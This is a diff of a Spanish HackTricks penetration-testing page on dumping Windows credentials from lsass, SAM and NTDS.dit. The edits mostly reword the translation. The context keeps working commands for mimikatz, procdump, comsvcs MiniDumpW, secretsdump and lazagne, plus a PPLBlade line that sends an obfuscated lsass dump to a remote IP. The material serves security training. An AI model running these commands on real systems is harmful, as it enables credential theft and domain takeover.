@@ -2,14 +2,14 @@
 
 <details>
 
-<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** Twitter 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
 * **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
@@ -62,7 +62,7 @@ mimikatz_command -f "lsadump::sam"
 ### Procdump + Mimikatz
 
 Dado que **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectada por Defender.\
-Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer** las **credenciales localmente** del volcado.
+Puedes utilizar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer** las **credenciales localmente** del volcado.
 
 {% code title="Volcar lsass" %}
 ```bash
@@ -92,7 +92,7 @@ Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-
 Una DLL llamada **comsvcs.dll** encontrada en `C:\Windows\System32` es responsable de **volcar la memoria del proceso** en caso de un fallo. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para ser invocada usando `rundll32.exe`.\
 No es relevante utilizar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso a volcar constituye el primer componente, la ubicación del archivo de volcado representa el segundo, y el tercer componente es estrictamente la palabra **full**. No existen opciones alternativas.\
 Al analizar estos tres componentes, la DLL se encarga de crear el archivo de volcado y transferir la memoria del proceso especificado a este archivo.\
-La utilización de **comsvcs.dll** es factible para volcar el proceso lsass, eliminando así la necesidad de cargar y ejecutar procdump. Este método se describe detalladamente en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+La utilización de **comsvcs.dll** es factible para volcar el proceso lsass, eliminando así la necesidad de cargar y ejecutar procdump. Este método se describe en detalle en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 El siguiente comando se emplea para la ejecución:
 ```bash
@@ -122,7 +122,7 @@ Get-Process -Name LSASS
 
 1. Saltar la protección PPL
 2. Ofuscar archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
-3. Cargar el volcado de memoria con métodos de carga RAW y SMB sin dejar rastro en el disco (volcado sin archivos)
+3. Subir el volcado de memoria con métodos de carga RAW y SMB sin dejar rastro en el disco (volcado sin archivo)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -196,8 +196,6 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Código del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-
 ### Invoke-NinjaCopy
 
 Finalmente, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
@@ -206,20 +204,19 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Credenciales de Active Directory - NTDS.dit**
 
-**El archivo Ntds.dit es una base de datos que almacena datos de Active Directory**, incluida información sobre objetos de usuario, grupos y membresía de grupos. Incluye los hashes de contraseñas de todos los usuarios en el dominio.
+El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, que contiene datos cruciales sobre objetos de usuario, grupos y sus membresías. Es donde se almacenan los **hashes de contraseñas** de los usuarios del dominio. Este archivo es una base de datos del **Motor de Almacenamiento Extensible (ESE)** y reside en **_%SystemRoom%/NTDS/ntds.dit_**.
 
-El importante archivo NTDS.dit estará **ubicado en**: _%SystemRoom%/NTDS/ntds.dit_\
-Este archivo es una base de datos _Extensible Storage Engine_ (ESE) y está "oficialmente" compuesto por 3 tablas:
+Dentro de esta base de datos, se mantienen tres tablas principales:
 
-* **Tabla de Datos**: Contiene la información sobre los objetos (usuarios, grupos...)
-* **Tabla de Enlaces**: Información sobre las relaciones (miembro de...)
-* **Tabla SD**: Contiene los descriptores de seguridad de cada objeto
+- **Tabla de Datos**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
+- **Tabla de Enlaces**: Lleva un registro de las relaciones, como las membresías de grupos.
+- **Tabla SD**: Aquí se almacenan los **descriptores de seguridad** de cada objeto, asegurando la seguridad y el control de acceso para los objetos almacenados.
 
 Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicado **dentro de la memoria de `lsass`** (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento al usar una **caché**).
+Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicado **dentro de la memoria de `lsass`** (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento mediante el uso de una **caché**).
 
-#### Descifrando los hashes dentro de NTDS.dit
+#### Descifrado de los hashes dentro de NTDS.dit
 
 El hash está cifrado 3 veces:
 
@@ -227,7 +224,7 @@ El hash está cifrado 3 veces:
 2. Descifrar el **hash** usando **PEK** y **RC4**.
 3. Descifrar el **hash** usando **DES**.
 
-**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** utilizando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** utilizando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por eso, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copiando NTDS.dit usando Ntdsutil
 
@@ -249,19 +246,19 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 Para **archivos NTDS.dit grandes** se recomienda extraerlos usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Finalmente, también puedes utilizar el **módulo de metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`
+Finalmente, también se puede utilizar el **módulo de metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`
 
 ### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**
 
-Los objetos de NTDS pueden ser extraídos a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para una mayor extracción de información cuando el archivo NTDS.dit en bruto ya ha sido recuperado.
+Los objetos de NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para una mayor extracción de información cuando el archivo NTDS.dit en bruto ya ha sido recuperado.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-El archivo `SYSTEM` es opcional pero permite la descifrado de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves kerberos o de confianza, historiales de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marcas de tiempo para el último inicio de sesión y cambio de contraseña, descripción de cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...
+El `hive SYSTEM` es opcional pero permite la descifrado de secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves kerberos o de confianza, historiales de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, indicadores UAC, marcas de tiempo para el último inicio de sesión y cambio de contraseña, descripción de cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...
 
 ## Lazagne
 
-Descarga el archivo binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este archivo binario para extraer credenciales de varios software.
+Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios software.
 ```
 lazagne.exe all
 ```
